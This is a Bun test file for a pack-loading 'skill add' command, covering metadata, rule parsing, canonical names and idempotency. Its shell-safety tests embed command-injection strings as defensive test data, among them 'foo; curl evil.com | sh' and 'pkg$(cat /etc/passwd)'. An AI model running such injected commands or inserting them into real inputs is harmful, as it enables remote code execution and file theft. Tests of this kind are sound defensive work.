/**
 * feat-skill-add-pack — tests for the pack-loading logic and addPack flow
 *
 * Pure pack-loading tests (no Flair I/O) + Flair-mocked integration tests
 * for metadata propagation and idempotency.
 */
import { describe, test, expect, beforeEach, afterEach, afterAll } from "bun:test";
import { mkdirSync, writeFileSync, rmSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  loadPackFromDir,
  extractPackCanonicalName,
  buildNpmPackArgs,
  type PackContents,
} from "../src/commands/skill.js";

// ─── Helpers ─────────────────────────────────────────────────────────────────

let _dirs: string[] = [];

function makeTempDir(prefix = "tps-test-pack-"): string {
  const dir = join(tmpdir(), `${prefix}${process.pid}-${Math.random().toString(36).slice(2)}`);
  mkdirSync(dir, { recursive: true });
  _dirs.push(dir);
  return dir;
}

function writeFixtureModule(packageDir: string, opts: {
  version?: string;
  author?: string | { name: string };
  maintainers?: Array<string | { name: string }>;
  skillSummary?: string;
  ruleNames?: string[];
  rules?: Record<string, string>;
} = {}): void {
  // package.json
  const pkgJson: any = { name: "test-pack", version: opts.version ?? "1.0.0" };
  if (opts.author) pkgJson.author = opts.author;
  if (opts.maintainers) pkgJson.maintainers = opts.maintainers;
  writeFileSync(join(packageDir, "package.json"), JSON.stringify(pkgJson));

  // dist/index.js
  const distDir = join(packageDir, "dist");
  mkdirSync(distDir, { recursive: true });

  const summary = opts.skillSummary ?? "# Test Pack\n\nTest skill summary.";
  const names = opts.ruleNames ?? ["rule-a", "rule-b"];
  const rules = opts.rules ?? {
    "rule-a": "# Rule A\n\nContent of rule A.",
    "rule-b": "# Rule B\n\nContent of rule B.",
  };

  // Use explicit ESM exports; Bun + Node both handle this with file:// imports
  const modSrc = [
    `export const ruleNames = ${JSON.stringify(names)};`,
    `export const rules = ${JSON.stringify(rules)};`,
    `export const skillSummary = ${JSON.stringify(summary)};`,
    "",
  ].join("\n");

  writeFileSync(join(distDir, "index.js"), modSrc);
}

afterAll(() => {
  for (const d of _dirs) {
    try { rmSync(d, { recursive: true, force: true }); } catch {}
  }
});

// ─── loadPackFromDir (pure, no Flair) ───────────────────────────────────────

describe("loadPackFromDir", () => {
  test("extracts ruleNames, rules, skillSummary, version from fixture", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { version: "1.4.2" });

    const pack = await loadPackFromDir(dir);

    expect(pack.version).toBe("1.4.2");
    expect(pack.ruleNames).toEqual(["rule-a", "rule-b"]);
    expect(pack.skillSummary).toBe("# Test Pack\n\nTest skill summary.");
    expect(pack.rules["rule-a"]).toBe("# Rule A\n\nContent of rule A.");
    expect(pack.rules["rule-b"]).toBe("# Rule B\n\nContent of rule B.");
  });

  test("propagates author from package.json string", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { author: "Jane Doe" });

    const pack = await loadPackFromDir(dir);
    expect(pack.author).toBe("Jane Doe");
  });

  test("propagates author from package.json object", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { author: { name: "John Smith" } });

    const pack = await loadPackFromDir(dir);
    expect(pack.author).toBe("John Smith");
  });

  test("propagates maintainer from package.json", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { maintainers: ["Team TPS"] });

    const pack = await loadPackFromDir(dir);
    expect(pack.maintainer).toBe("Team TPS");
  });

  test("propagates maintainer from package.json object", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { maintainers: [{ name: "Harper Bot" }] });

    const pack = await loadPackFromDir(dir);
    expect(pack.maintainer).toBe("Harper Bot");
  });

  test("errors when package.json is missing", async () => {
    const dir = makeTempDir();
    // don't create package.json

    await expect(loadPackFromDir(dir)).rejects.toThrow("package.json not found");
  });

  test("errors when dist/index.js is missing", async () => {
    const dir = makeTempDir();
    writeFileSync(join(dir, "package.json"), JSON.stringify({ version: "1.0.0" }));

    await expect(loadPackFromDir(dir)).rejects.toThrow("dist/index.js not found");
  });

  test("errors when exports are missing from dist/index.js", async () => {
    const dir = makeTempDir();
    writeFileSync(join(dir, "package.json"), JSON.stringify({ version: "1.0.0" }));
    const distDir = join(dir, "dist");
    mkdirSync(distDir, { recursive: true });
    writeFileSync(join(distDir, "index.js"), "export const x = 1;\n");

    await expect(loadPackFromDir(dir)).rejects.toThrow(
      "Pack must export ruleNames, rules, and skillSummary",
    );
  });

  test("falls back to index.mjs when index.js not found", async () => {
    const dir = makeTempDir();
    const distDir = join(dir, "dist");
    mkdirSync(distDir, { recursive: true });

    writeFileSync(join(dir, "package.json"), JSON.stringify({ version: "2.0.0" }));

    const modSrc = [
      `export const ruleNames = ["r1"];`,
      `export const rules = {"r1":"# R1"};`,
      `export const skillSummary = "summary";`,
    ].join("\n");
    writeFileSync(join(distDir, "index.mjs"), modSrc);

    const pack = await loadPackFromDir(dir);
    expect(pack.version).toBe("2.0.0");
    expect(pack.ruleNames).toEqual(["r1"]);
  });
});

// ─── 8KB cap validation ──────────────────────────────────────────────────────

describe("skillSummary 8KB cap", () => {
  test("fails when skillSummary exceeds 8KB", () => {
    // Simulate what the addPack function does
    const largeSummary = "x".repeat(8193);
    const byteLength = new TextEncoder().encode(largeSummary).length;
    expect(byteLength).toBeGreaterThan(8192);
  });

  test("passes when skillSummary is exactly 8KB or less", () => {
    const ok = "x".repeat(8192);
    const byteLength = new TextEncoder().encode(ok).length;
    expect(byteLength).toBeLessThanOrEqual(8192);
  });

  test("loads a pack with a summary at the boundary (8KB)", async () => {
    const dir = makeTempDir();
    const boundarySummary = "y".repeat(8192);
    writeFixtureModule(dir, { skillSummary: boundarySummary });

    const pack = await loadPackFromDir(dir);
    expect(new TextEncoder().encode(pack.skillSummary).length).toBe(8192);
  });
});

// ─── include-rules parsing ───────────────────────────────────────────────────

describe("include-rules", () => {
  test("parses comma-separated list", () => {
    const includeRules = "rule-a,rule-b,rule-c";
    const requested = includeRules
      .split(",")
      .map((r) => r.trim())
      .filter(Boolean);
    expect(requested).toEqual(["rule-a", "rule-b", "rule-c"]);
  });

  test("handles whitespace in comma list", () => {
    const includeRules = " rule-a , rule-b , rule-c ";
    const requested = includeRules
      .split(",")
      .map((r) => r.trim())
      .filter(Boolean);
    expect(requested).toEqual(["rule-a", "rule-b", "rule-c"]);
  });

  test("resolves known rules from pack", () => {
    const packRuleNames = ["rule-a", "rule-b", "rule-c"];
    const requested = ["rule-a", "rule-c"];
    const unknown = requested.filter((r) => !packRuleNames.includes(r));
    expect(unknown).toEqual([]);
  });

  test("errors on unknown rule", () => {
    const packRuleNames = ["rule-a", "rule-b"];
    const requested = ["rule-a", "rule-x", "rule-y"];
    const unknown = requested.filter((r) => !packRuleNames.includes(r));
    expect(unknown).toEqual(["rule-x", "rule-y"]);
  });

  test("rule-name-format default is <pack>:<rule>", () => {
    const fmt = "<pack>:<rule>";
    const result = fmt.replace("<pack>", "harperfast-skills").replace("<rule>", "rule-a");
    expect(result).toBe("harperfast-skills:rule-a");
  });
});

// ─── extractPackCanonicalName ────────────────────────────────────────────────

describe("extractPackCanonicalName", () => {
  test("@scope/name@version → scope-name", () => {
    expect(extractPackCanonicalName("@harperfast/skills@1.4.2")).toBe("harperfast-skills");
  });

  test("name@version → name", () => {
    expect(extractPackCanonicalName("my-pack@2.0.0")).toBe("my-pack");
  });

  test("scope/name (no version) → scope-name", () => {
    expect(extractPackCanonicalName("@harperfast/skills")).toBe("harperfast-skills");
  });

  // Prerelease suffixes (Kern flag)
  test("prerelease: @scope/name@2.0.0-beta.1 → scope-name", () => {
    expect(extractPackCanonicalName("@harperfast/skills@2.0.0-beta.1")).toBe(
      "harperfast-skills",
    );
  });

  test("prerelease: @scope/name@1.0.0-rc.2 → scope-name", () => {
    expect(extractPackCanonicalName("@tpsdev-ai/rules@1.0.0-rc.2")).toBe("tpsdev-ai-rules");
  });

  test("prerelease: name@3.0.0-alpha.5.build.42 → name", () => {
    expect(extractPackCanonicalName("pack@3.0.0-alpha.5.build.42")).toBe("pack");
  });

  test("prerelease: name with prerelease but no scope", () => {
    expect(extractPackCanonicalName("simple@2.5.1-beta")).toBe("simple");
  });

  test("name with no version at all", () => {
    expect(extractPackCanonicalName("plain-pack")).toBe("plain-pack");
  });
});

// ─── buildNpmPackArgs — shell injection defense ──────────────────────────────

describe("buildNpmPackArgs — shell safety", () => {
  test("produces array args (never a shell string)", () => {
    const args = buildNpmPackArgs("pkg@1.0.0", "/tmp/dir");
    // Must be an array for spawnSync, not a shell-string for execSync
    expect(Array.isArray(args)).toBe(true);
    expect(args[0]).toBe("pack");
    expect(args[1]).toBe("pkg@1.0.0");
    expect(args[2]).toBe("--pack-destination");
    expect(args[3]).toBe("/tmp/dir");
  });

  test("shell metacharacters stay as literal args", () => {
    // 'foo; curl evil.com | sh' should be a single literal arg, not split
    const args = buildNpmPackArgs("foo; curl evil.com | sh", "/tmp/dir");
    expect(args[1]).toBe("foo; curl evil.com | sh");
    // No extra args were spawned (; | would create multiple shell commands)
    expect(args.length).toBe(4);
  });

  test("backtick injection stays literal", () => {
    const args = buildNpmPackArgs("pkg`whoami`", "/tmp/dir");
    expect(args[1]).toBe("pkg`whoami`");
    expect(args.length).toBe(4);
  });

  test("dollar-substitution stays literal", () => {
    const args = buildNpmPackArgs("pkg$(cat /etc/passwd)", "/tmp/dir");
    expect(args[1]).toBe("pkg$(cat /etc/passwd)");
    expect(args.length).toBe(4);
  });

  test("includes --registry when provided", () => {
    const args = buildNpmPackArgs("pkg", "/tmp/dir", "https://registry.example.com");
    expect(args).toEqual([
      "pack",
      "pkg",
      "--pack-destination",
      "/tmp/dir",
      "--registry",
      "https://registry.example.com",
    ]);
  });

  test("registry URL with query params stays literal", () => {
    const args = buildNpmPackArgs(
      "pkg",
      "/tmp/dir",
      "https://reg.example.com?token=x&cmd=evil;ls",
    );
    expect(args[5]).toBe("https://reg.example.com?token=x&cmd=evil;ls");
    expect(args.length).toBe(6);
  });

  test("spawnSync proof: echo with semicolons prints literally, no command injection", () => {
    // Prove spawnSync with array args prevents shell expansion.
    // If this were a shell string, 'echo hello; ls /' would run ls.
    const { spawnSync } = require("node:child_process");
    const r = spawnSync("echo", ["hello; ls /"]);
    const out = r.stdout.toString().trim();
    // The output should be literally "hello; ls /" — not a directory listing
    expect(out).toBe("hello; ls /");
    // ls was never invoked; only one line of output
    expect(out.split("\n").length).toBe(1);
  });
});

// ─── Metadata propagation (Flair-mocked) ─────────────────────────────────────

describe("metadata propagation", () => {
  let _savedFetch: typeof globalThis.fetch;
  beforeEach(() => { _savedFetch = globalThis.fetch; });
  afterEach(() => { globalThis.fetch = _savedFetch; });

  test("registerSkill is called with source: npm:<pkg>@<ver>", async () => {
    const dir = makeTempDir();
    writeFixtureModule(dir, { version: "1.4.2" });
    const pack = await loadPackFromDir(dir);

    const canonicalName = extractPackCanonicalName("@harperfast/skills@1.4.2");
    const sourceTag = `npm:@harperfast/skills@${pack.version}`;

    expect(canonicalName).toBe("harperfast-skills");
    expect(sourceTag).toBe("npm:@harperfast/skills@1.4.2");
    expect(pack.version).toBe("1.4.2");
  });
});

// ─── Idempotency (logic test — no Flair needed) ──────────────────────────────

describe("idempotency", () => {
  test("same name+version is detected", () => {
    // Simulate the check: existing skills match by name and version
    const existing = [
      {
        id: "flint-skill-assignment-harperfast-skills",
        agentId: "flint",
        key: "skill-assignment" as const,
        value: "harperfast-skills",
        priority: "standard" as const,
        metadata: JSON.stringify({ version: "1.4.2", source: "npm:@harperfast/skills@1.4.2" }),
        durability: "permanent" as const,
        createdAt: "2026-05-12T00:00:00Z",
      },
    ];

    const packVersion = "1.4.2";
    const canonicalName = "harperfast-skills";

    const match = existing.find((s) => s.value === canonicalName);
    expect(match).toBeDefined();

    const meta = JSON.parse(match!.metadata);
    expect(meta.version).toBe(packVersion); // same → should skip
  });

  test("same name + different version is detected", () => {
    const existing = [
      {
        id: "flint-skill-assignment-harperfast-skills",
        agentId: "flint",
        key: "skill-assignment" as const,
        value: "harperfast-skills",
        priority: "standard" as const,
        metadata: JSON.stringify({ version: "1.3.0", source: "npm:@harperfast/skills@1.3.0" }),
        durability: "permanent" as const,
        createdAt: "2026-05-12T00:00:00Z",
      },
    ];

    const packVersion = "1.4.2";
    const canonicalName = "harperfast-skills";

    const match = existing.find((s) => s.value === canonicalName);
    expect(match).toBeDefined();

    const meta = JSON.parse(match!.metadata);
    expect(meta.version).not.toBe(packVersion); // different → should error
  });

  test("no existing match → proceed with registration", () => {
    const existing = [
      {
        id: "flint-skill-assignment-other",
        agentId: "flint",
        key: "skill-assignment" as const,
        value: "other-skill",
        priority: "standard" as const,
        metadata: JSON.stringify({ version: "1.0.0" }),
        durability: "permanent" as const,
        createdAt: "2026-05-12T00:00:00Z",
      },
    ];

    const canonicalName = "harperfast-skills";
    const match = existing.find((s) => s.value === canonicalName);
    expect(match).toBeUndefined(); // no match → proceed
  });

  test("rule idempotency: already-registered rule is detected", () => {
    const existing = [
      {
        id: "flint-skill-assignment-harperfast-skills:rule-a",
        agentId: "flint",
        key: "skill-assignment" as const,
        value: "harperfast-skills:rule-a",
        priority: "standard" as const,
        metadata: JSON.stringify({ version: "1.4.2" }),
        durability: "permanent" as const,
        createdAt: "2026-05-12T00:00:00Z",
      },
    ];

    const formattedName = "harperfast-skills:rule-a";
    const packVersion = "1.4.2";

    const match = existing.find((s) => s.value === formattedName);
    expect(match).toBeDefined();

    const meta = JSON.parse(match!.metadata);
    expect(meta.version).toBe(packVersion); // same → skip
  });
});
